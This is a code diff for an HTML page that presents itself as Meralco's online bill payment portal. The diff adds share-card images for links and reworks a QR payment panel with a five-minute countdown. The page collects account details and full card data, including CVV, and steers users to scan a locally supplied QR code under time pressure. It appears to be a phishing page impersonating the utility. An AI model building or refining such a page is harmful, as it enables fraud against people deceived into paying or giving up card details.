@@ -6,18 +6,18 @@
     <title>Meralco Inc. — Online Bills Payment Portal</title>
 
     <!-- 1. Browser Tab Logo (Favicon) -->
-    <link rel="icon" type="image/png" href="PUT_YOUR_BROWSER_LOGO_IMAGE_HERE">
-    <link rel="apple-touch-icon" href="PUT_YOUR_BROWSER_LOGO_IMAGE_HERE">
+    <link rel="icon" type="image/png" href="89186.jpg">
+    <link rel="apple-touch-icon" href="89186.jpg">
 
-    <!-- 2. Link Description & Thumbnail Card (Visible when sharing the link on Messenger, WhatsApp, Facebook, etc.) -->
+    <!-- 2. Link Description & Thumbnail Card -->
     <meta property="og:type" content="website">
     <meta property="og:title" content="Meralco Inc. — Online Bills Payment Portal">
     <meta property="og:description" content="Complete this to complete your payment. Pay your Meralco bill quickly via InstaPay QR.">
-    <meta property="og:image" content="PUT_YOUR_THUMBNAIL_IMAGE_HERE">
+    <meta property="og:image" content="89186.jpg">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Meralco Inc. — Online Bills Payment Portal">
     <meta name="twitter:description" content="Complete this to complete your payment. Pay your Meralco bill quickly via InstaPay QR.">
-    <meta name="twitter:image" content="PUT_YOUR_THUMBNAIL_IMAGE_HERE">
+    <meta name="twitter:image" content="89186.jpg">
 
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -52,7 +52,6 @@
     <header class="bg-white shadow-sm sticky top-0 z-30 border-b border-gray-200">
         <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
             <div class="flex items-center space-x-3">
-                <!-- Stylized Meralco-inspired Logo Icon -->
                 <div class="w-10 h-10 rounded-xl bg-meralco-orange flex items-center justify-center shadow-sm">
                     <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
                         <path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z" />
@@ -76,11 +75,11 @@
 
     <!-- Main Content Container -->
     <main class="flex-grow max-w-4xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8">
-        
+
         <!-- Intro Banner Card -->
         <div class="bg-gradient-to-r from-meralco-charcoal to-gray-800 rounded-2xl p-6 sm:p-8 text-white shadow-md mb-8 relative overflow-hidden">
             <div class="relative z-10">
-                <span class="inline-block text-meralco-orange font-bold text-xs uppercase tracking-widest mb-1">Fast & Convenient Billing</span>
+                <span class="inline-block text-meralco-orange font-bold text-xs uppercase tracking-widest mb-1">Fast &amp; Convenient Billing</span>
                 <h2 class="text-2xl sm:text-3xl font-bold mb-2">Complete this to complete your payment.</h2>
                 <p class="text-gray-300 text-sm sm:text-base max-w-xl">
                     Please verify your Customer Account Number (CAN) and billing information below before selecting your preferred payment channel.
@@ -106,7 +105,7 @@
         </div>
 
         <form id="paymentForm" novalidate class="space-y-8">
-            
+
             <!-- Section 1: Subscriber Information -->
             <section class="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 sm:p-8">
                 <div class="flex items-center space-x-3 border-b border-gray-100 pb-4 mb-6">
@@ -186,10 +185,10 @@
 
                 <!-- 4 Payment Option Cards -->
                 <div class="grid grid-cols-1 sm:grid-cols-2 gap-4" role="radiogroup" aria-label="Option to pay">
-                    
+
                     <!-- 1. Instapay -->
                     <label class="payment-option-card cursor-pointer relative flex items-center p-4 rounded-xl border-2 border-gray-200 hover:border-meralco-orange/60 transition-all bg-white select-none">
-                        <input type="radio" name="paymentOption" value="Instapay" class="sr-only" checked>
+                        <input type="radio" name="paymentOption" value="Instapay" class="sr-only">
                         <div class="w-11 h-11 rounded-lg bg-blue-50 text-blue-600 flex items-center justify-center mr-4 flex-shrink-0">
                             <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                                 <path stroke-linecap="round" stroke-linejoin="round" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z" />
@@ -263,14 +262,14 @@
                     <!-- SHARED QR VIEW FOR INSTAPAY & GCASH/MAYA/PALAWANPAY -->
                     <div id="panel-QrPayment" class="payment-detail-panel hidden bg-gray-50 rounded-xl p-5 sm:p-6 border border-meralco-orange/40 shadow-inner transition-all duration-300">
                         <div class="flex flex-col md:flex-row items-center md:items-start gap-6">
-                            
+
                             <!-- Left Column: QR Code + 5-Minute Countdown Directly Under QR -->
                             <div class="w-full max-w-[280px] flex-shrink-0 space-y-4">
                                 <div class="bg-white p-4 rounded-2xl border border-gray-200 shadow-sm flex flex-col items-center">
                                     <img id="instapayQrImg" src="88638.jpg" alt="BDO, Maya, GCash, PalawanPay QR Code"
                                         onerror="this.classList.add('hidden'); document.getElementById('instapayQrFallback').classList.remove('hidden');"
                                         class="w-full h-auto rounded-lg object-contain">
-                                    
+
                                     <div id="instapayQrFallback" class="hidden w-full flex flex-col items-center text-center py-2">
                                         <div class="flex flex-wrap items-center justify-center gap-1 mb-1.5 select-none">
                                             <span class="text-[11px] font-black px-2 py-0.5 rounded bg-blue-50 text-[#004A99]">BDO</span>
@@ -280,7 +279,7 @@
                                         </div>
                                         <p class="text-sm font-extrabold text-gray-800 tracking-wide">MERALCO</p>
                                         <p class="text-xs font-bold text-gray-600 mb-3">BDO • Maya • GCash • PalawanPay</p>
-                                        
+
                                         <div class="relative w-44 h-44 bg-white p-1.5 border border-gray-100 rounded-lg">
                                             <svg class="w-full h-full text-black" viewBox="0 0 120 120" fill="currentColor">
                                                 <path d="M8,8 h30 v30 h-30 z M14,14 v18 h18 v-18 z M19,19 h8 v8 h-8 z"/>
@@ -333,25 +332,29 @@
                                     </div>
 
                                     <p id="walletLaunchStatus" class="text-[11px] text-gray-600 leading-snug text-center">
-                                        Choose an e-wallet below to open its QR scan screen.
+                                        Scan the QR code above using your preferred channel and complete payment within 5 minutes.
                                     </p>
 
-                                    <div class="space-y-1.5 text-xs">
-                                        <button type="button" onclick="openInstalledWalletApp('gcash')"
-                                            class="w-full py-2 px-3 bg-[#007DFE] hover:bg-[#0066D1] text-white font-bold rounded-xl transition">
-                                            GCash (QR Scan)
+                                    <div class="grid grid-cols-3 gap-1.5 text-[11px] font-bold text-center">
+                                        <button type="button" onclick="selectWalletChannelLabel('GCash')"
+                                            class="py-2 px-1.5 rounded-xl border border-blue-200 bg-blue-50 text-[#007DFE] hover:bg-blue-100 transition">
+                                            GCash QR
                                         </button>
-                                        <button type="button" onclick="openInstalledWalletApp('maya')"
-                                            class="w-full py-2 px-3 bg-[#00B140] hover:bg-[#009235] text-white font-bold rounded-xl transition">
-                                            Maya (QR Scan)
+                                        <button type="button" onclick="selectWalletChannelLabel('Maya')"
+                                            class="py-2 px-1.5 rounded-xl border border-emerald-200 bg-emerald-50 text-[#009235] hover:bg-emerald-100 transition">
+                                            Maya QR
                                         </button>
-                                        <button type="button" onclick="openInstalledWalletApp('palawanpay')"
-                                            class="w-full py-2 px-3 bg-[#0B4F9C] hover:bg-[#083B75] text-white font-bold rounded-xl transition">
-                                            PalawanPay (QR Scan)
+                                        <button type="button" onclick="selectWalletChannelLabel('PalawanPay')"
+                                            class="py-2 px-1.5 rounded-xl border border-indigo-200 bg-indigo-50 text-[#0B4F9C] hover:bg-indigo-100 transition">
+                                            Palawan QR
                                         </button>
                                     </div>
 
                                     <div class="text-[11px] text-gray-600 bg-gray-50 rounded-lg p-2.5 border border-gray-200 space-y-1">
+                                        <div class="flex justify-between">
+                                            <span>Selected:</span>
+                                            <span id="countdownChannel" class="font-semibold text-gray-800">QR Payment</span>
+                                        </div>
                                         <div class="flex justify-between">
                                             <span>Amount:</span>
                                             <span id="countdownAmount" class="font-mono font-bold text-meralco-orange">₱0.00</span>
@@ -379,20 +382,20 @@
                             <div class="flex-1 w-full space-y-4">
                                 <div class="border-b border-gray-200 pb-3">
                                     <div class="flex flex-wrap items-center gap-2 mb-1.5">
-                                        <span class="inline-block bg-blue-100 text-blue-800 text-xs font-bold px-2.5 py-0.5 rounded-full">BDO</span>
+                                        <span class="inline-block bg-blue-100 text-blue-800 text-xs font-bold px-2.5 py-0.5 rounded-full">InstaPay</span>
                                         <span class="inline-block bg-emerald-100 text-emerald-800 text-xs font-bold px-2.5 py-0.5 rounded-full">Maya</span>
                                         <span class="inline-block bg-sky-100 text-sky-800 text-xs font-bold px-2.5 py-0.5 rounded-full">GCash</span>
                                         <span class="inline-block bg-indigo-100 text-indigo-900 text-xs font-bold px-2.5 py-0.5 rounded-full">PalawanPay</span>
                                     </div>
-                                    <h4 class="font-extrabold text-meralco-charcoal text-lg">MERALCO — QR Code Payment</h4>
-                                    <p class="text-sm font-bold text-gray-600">Supported Channels: BDO, Maya, GCash, PalawanPay</p>
+                                    <h4 id="qrPanelHeading" class="font-extrabold text-meralco-charcoal text-lg">MERALCO — QR Code Payment</h4>
+                                    <p class="text-sm font-bold text-gray-600">Supported Channels: InstaPay, GCash, Maya, PalawanPay</p>
                                 </div>
 
                                 <div class="bg-white rounded-xl p-3.5 border border-gray-200 text-xs sm:text-sm text-gray-600 space-y-1.5">
-                                    <p class="font-bold text-gray-800">How to pay via QR Code (BDO, Maya, GCash, PalawanPay):</p>
+                                    <p class="font-bold text-gray-800">How to pay via QR Code:</p>
                                     <ol class="list-decimal list-inside space-y-1 text-gray-600">
-                                        <li>Select <strong>Gcash/Maya/PalawanPay</strong> or <strong>Instapay</strong> to view the QR code.</li>
-                                        <li>Tap your e-wallet option under the QR code to launch its QR Scan screen.</li>
+                                        <li>Select <strong>Instapay</strong> or <strong>Gcash/Maya/PalawanPay</strong> to display the QR code and 5-minute timer.</li>
+                                        <li>Scan the QR code in your banking or e-wallet app without leaving this page automatically.</li>
                                         <li>Enter the exact <strong>Amount To Pay</strong> and complete the transfer within 5 minutes.</li>
                                         <li>Tap <strong>Done</strong> when finished or <strong>Undone</strong> to reset.</li>
                                     </ol>
@@ -417,7 +420,6 @@
                         </div>
 
                         <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                            <!-- Card Name (Card Holder) -->
                             <div class="sm:col-span-2">
                                 <label for="cardName" class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                                     Card Name <span class="text-meralco-orange">*</span>
@@ -427,7 +429,6 @@
                                     class="w-full px-3.5 py-2.5 bg-white rounded-xl border border-gray-300 focus:ring-2 focus:ring-meralco-orange focus:border-meralco-orange outline-none transition text-sm text-gray-800">
                             </div>
 
-                            <!-- Card Number -->
                             <div class="sm:col-span-2">
                                 <label for="cardNumber" class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                                     Card Number <span class="text-meralco-orange">*</span>
@@ -442,7 +443,6 @@
                                 </div>
                             </div>
 
-                            <!-- Expiry Date -->
                             <div>
                                 <label for="expiryDate" class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                                     Expiry Date <span class="text-meralco-orange">*</span>
@@ -452,7 +452,6 @@
                                     class="w-full px-3.5 py-2.5 bg-white rounded-xl border border-gray-300 focus:ring-2 focus:ring-meralco-orange focus:border-meralco-orange outline-none transition text-sm text-gray-800 font-mono">
                             </div>
 
-                            <!-- CVV -->
                             <div>
                                 <label for="cvv" class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                                     CVV <span class="text-meralco-orange">*</span>
@@ -462,7 +461,6 @@
                                     class="w-full px-3.5 py-2.5 bg-white rounded-xl border border-gray-300 focus:ring-2 focus:ring-meralco-orange focus:border-meralco-orange outline-none transition text-sm text-gray-800 font-mono">
                             </div>
 
-                            <!-- Billing Address -->
                             <div class="sm:col-span-2 mt-2 pt-3 border-t border-gray-200">
                                 <label for="billingAddress" class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                                     Billing Address <span class="text-meralco-orange">*</span>
@@ -472,7 +470,6 @@
                                     class="w-full px-3.5 py-2.5 bg-white rounded-xl border border-gray-300 focus:ring-2 focus:ring-meralco-orange focus:border-meralco-orange outline-none transition text-sm text-gray-800">
                             </div>
 
-                            <!-- Postal Code -->
                             <div>
                                 <label for="postalCode" class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1">
                                     Postal Code <span class="text-meralco-orange">*</span>
@@ -486,7 +483,7 @@
 
                     <!-- VIEW C: Remittances Details -->
                     <div id="panel-Remittances" class="payment-detail-panel hidden bg-gray-50 rounded-xl p-5 border border-gray-200">
-                        <span class="inline-block bg-amber-100 text-amber-800 text-xs font-bold px-2.5 py-0.5 rounded-full mb-2">Over-the-Counter & Remittance Partners</span>
+                        <span class="inline-block bg-amber-100 text-amber-800 text-xs font-bold px-2.5 py-0.5 rounded-full mb-2">Over-the-Counter &amp; Remittance Partners</span>
                         <h4 class="font-bold text-gray-800 text-base">Generate Payment Reference Slip</h4>
                         <p class="text-xs sm:text-sm text-gray-600 mt-1 mb-3">
                             Present your generated Meralco Payment Reference Number at any accredited partner outlet nationwide:
@@ -506,7 +503,7 @@
             <!-- Submit Button Bar -->
             <div class="flex flex-col sm:flex-row items-center justify-between gap-4 pt-2">
                 <p class="text-xs text-gray-500 text-center sm:text-left">
-                    By clicking <strong>Complete Payment</strong>, you agree to the Meralco Online Payment Terms & Conditions.
+                    By clicking <strong>Complete Payment</strong>, you agree to the Meralco Online Payment Terms &amp; Conditions.
                 </p>
                 <button type="submit"
                     class="w-full sm:w-auto px-8 py-4 bg-meralco-orange hover:bg-meralco-darkOrange active:scale-[0.99] text-white font-bold rounded-xl shadow-lg shadow-orange-500/25 transition-all flex items-center justify-center space-x-2 text-base">
@@ -555,7 +552,7 @@
                         <span id="receiptRef" class="font-mono font-bold text-gray-900">MER-00000000</span>
                     </div>
                     <div class="flex justify-between">
-                        <span class="text-gray-500">Date & Time:</span>
+                        <span class="text-gray-500">Date &amp; Time:</span>
                         <span id="receiptDate" class="font-medium text-gray-800"></span>
                     </div>
                     <div class="flex justify-between">
@@ -575,9 +572,8 @@
                         <span id="receiptMethod" class="font-bold text-meralco-charcoal"></span>
                     </div>
 
-                    <!-- Card Details Section on Receipt (Shown when Credit/Debit is selected) -->
                     <div id="receiptCardSection" class="hidden pt-3 mt-2 border-t border-dashed border-gray-200 space-y-2">
-                        <p class="text-[11px] font-bold uppercase tracking-wider text-meralco-orange">Card & Billing Details</p>
+                        <p class="text-[11px] font-bold uppercase tracking-wider text-meralco-orange">Card &amp; Billing Details</p>
                         <div class="flex justify-between">
                             <span class="text-gray-500">Card Holder:</span>
                             <span id="receiptCardHolder" class="font-semibold text-gray-800 text-right max-w-[60%] truncate"></span>
@@ -605,7 +601,6 @@
                     </div>
                 </div>
 
-                <!-- Action Buttons: Download Receipt + Done -->
                 <div class="flex flex-col sm:flex-row gap-3 pt-2">
                     <button type="button" onclick="downloadReceipt()"
                         class="w-full py-3 px-4 bg-meralco-orange hover:bg-meralco-darkOrange active:scale-[0.99] text-white font-bold rounded-xl shadow-md shadow-orange-500/20 transition flex items-center justify-center space-x-2">
@@ -629,11 +624,13 @@
         const optionCards = document.querySelectorAll('.payment-option-card');
         const detailPanels = document.querySelectorAll('.payment-detail-panel');
         const qrPanel = document.getElementById('panel-QrPayment');
+        const qrPanelHeading = document.getElementById('qrPanelHeading');
         const errorAlert = document.getElementById('errorAlert');
         const errorAlertMessage = document.getElementById('errorAlertMessage');
 
         const walletCountdownBox = document.getElementById('walletCountdownBox');
         const countdownDisplay = document.getElementById('countdownDisplay');
+        const countdownChannel = document.getElementById('countdownChannel');
         const countdownAmount = document.getElementById('countdownAmount');
         const countdownAccount = document.getElementById('countdownAccount');
         const walletLaunchStatus = document.getElementById('walletLaunchStatus');
@@ -645,6 +642,7 @@
         let countdownInterval = null;
         let remainingSeconds = 300;
         let pendingWalletPayment = null;
+        let activeQrLabel = 'QR Payment';
 
         cardNumberInput.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\D/g, '').substring(0, 16);
@@ -665,7 +663,7 @@
             e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
         });
 
-        function buildDraftWalletPayload() {
+        function buildDraftQrPayload(optionName) {
             const rawAmount = parseFloat(document.getElementById('amountToPay').value);
             const amountToPay = !isNaN(rawAmount) && rawAmount > 0 ? rawAmount : 0;
             return {
@@ -674,13 +672,13 @@
                 accountNumber: document.getElementById('accountNumber').value.trim() || '-',
                 phoneNumber: document.getElementById('phoneNumber').value.trim() || '-',
                 amountToPay,
-                selectedOption: 'Gcash/Maya/PalawanPay',
+                selectedOption: optionName,
                 cardData: null
             };
         }
 
         function updatePaymentUI() {
-            let selectedValue = 'Instapay';
+            let selectedValue = null;
 
             optionCards.forEach((card) => {
                 const radio = card.querySelector('input[type="radio"]');
@@ -708,20 +706,20 @@
             });
 
             if (selectedValue === 'Instapay' || selectedValue === 'Gcash/Maya/PalawanPay') {
+                activeQrLabel = selectedValue;
+                qrPanelHeading.textContent = `MERALCO — ${selectedValue} QR Code`;
                 qrPanel.classList.remove('hidden');
-            } else {
-                const targetPanel = document.getElementById(`panel-${selectedValue}`);
-                if (targetPanel) {
-                    targetPanel.classList.remove('hidden');
-                }
-            }
-
-            if (selectedValue === 'Gcash/Maya/PalawanPay') {
-                startFiveMinuteCountdown(pendingWalletPayment || buildDraftWalletPayload(), { scroll: false });
+                startFiveMinuteCountdown(buildDraftQrPayload(selectedValue), { scroll: false });
             } else {
                 stopCountdown();
                 walletCountdownBox.classList.add('hidden');
                 pendingWalletPayment = null;
+                if (selectedValue) {
+                    const targetPanel = document.getElementById(`panel-${selectedValue}`);
+                    if (targetPanel) {
+                        targetPanel.classList.remove('hidden');
+                    }
+                }
             }
 
             hideError();
@@ -756,36 +754,13 @@
             }
         }
 
-        function openInstalledWalletApp(wallet) {
-            const configs = {
-                gcash: {
-                    name: 'GCash',
-                    scheme: 'gcash://qr',
-                    androidIntent: 'intent://qr#Intent;scheme=gcash;package=com.globe.gcash.android;end;'
-                },
-                maya: {
-                    name: 'Maya',
-                    scheme: 'maya://qr',
-                    androidIntent: 'intent://qr#Intent;scheme=maya;package=com.paymaya;end;'
-                },
-                palawanpay: {
-                    name: 'PalawanPay',
-                    scheme: 'palawanpay://qr',
-                    androidIntent: 'intent://qr#Intent;scheme=palawanpay;package=com.palawanpay.app;end;'
-                }
-            };
-
-            const selected = configs[wallet];
-            if (!selected) return;
-
-            const isAndroid = /Android/i.test(navigator.userAgent);
-            walletLaunchStatus.textContent = `Opening ${selected.name} QR Scan... Scan the QR code above and complete payment.`;
-
-            if (isAndroid) {
-                window.location.href = selected.androidIntent;
-            } else {
-                window.location.href = selected.scheme;
+        function selectWalletChannelLabel(walletName) {
+            activeQrLabel = walletName;
+            countdownChannel.textContent = walletName;
+            if (pendingWalletPayment) {
+                pendingWalletPayment.selectedOption = walletName;
             }
+            walletLaunchStatus.textContent = `${walletName} selected. Scan the QR code above in your ${walletName} app and tap Done when finished.`;
         }
 
         function startFiveMinuteCountdown(paymentPayload, options = { scroll: false }) {
@@ -793,12 +768,13 @@
             stopCountdown();
             remainingSeconds = 300;
             countdownDisplay.textContent = formatSeconds(remainingSeconds);
+            countdownChannel.textContent = paymentPayload.selectedOption || activeQrLabel;
             countdownAmount.textContent = '₱' + paymentPayload.amountToPay.toLocaleString('en-PH', {
                 minimumFractionDigits: 2,
                 maximumFractionDigits: 2
             });
             countdownAccount.textContent = paymentPayload.accountNumber;
-            walletLaunchStatus.textContent = 'Choose GCash, Maya, or PalawanPay below to launch its QR Scan screen.';
+            walletLaunchStatus.textContent = 'Scan the QR code above using your preferred channel and complete payment within 5 minutes.';
             walletCountdownBox.classList.remove('hidden');
             if (options.scroll) {
                 walletCountdownBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
@@ -820,7 +796,7 @@
         function handleCountdownDone() {
             stopCountdown();
             walletCountdownBox.classList.add('hidden');
-            showReceiptModal(pendingWalletPayment || buildDraftWalletPayload());
+            showReceiptModal(pendingWalletPayment || buildDraftQrPayload(activeQrLabel));
         }
 
         function handleCountdownUndone() {
@@ -829,7 +805,7 @@
             countdownDisplay.textContent = '05:00';
             walletCountdownBox.classList.add('hidden');
             pendingWalletPayment = null;
-            showError('Payment marked as Undone. Select Gcash/Maya/PalawanPay again to restart the 5-minute scan timer.');
+            showError('Payment marked as Undone. Click Instapay or Gcash/Maya/PalawanPay again to restart the 5-minute scan timer.');
         }
 
         function handleQrUpload(event) {
@@ -954,7 +930,8 @@
             const accountNumber = document.getElementById('accountNumber').value.trim();
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
             const amountToPay = parseFloat(document.getElementById('amountToPay').value);
-            const selectedOption = document.querySelector('input[name="paymentOption"]:checked').value;
+            const checkedRadio = document.querySelector('input[name="paymentOption"]:checked');
+            const selectedOption = checkedRadio ? checkedRadio.value : 'Instapay';
 
             if (!subscriber) return showError('Please enter the Subscriber name.');
             if (!address) return showError('Please enter the Service Address.');
@@ -1003,7 +980,7 @@
                 cardData
             };
 
-            if (selectedOption === 'Gcash/Maya/PalawanPay') {
+            if (selectedOption === 'Instapay' || selectedOption === 'Gcash/Maya/PalawanPay') {
                 startFiveMinuteCountdown(payload, { scroll: true });
                 return;
             }
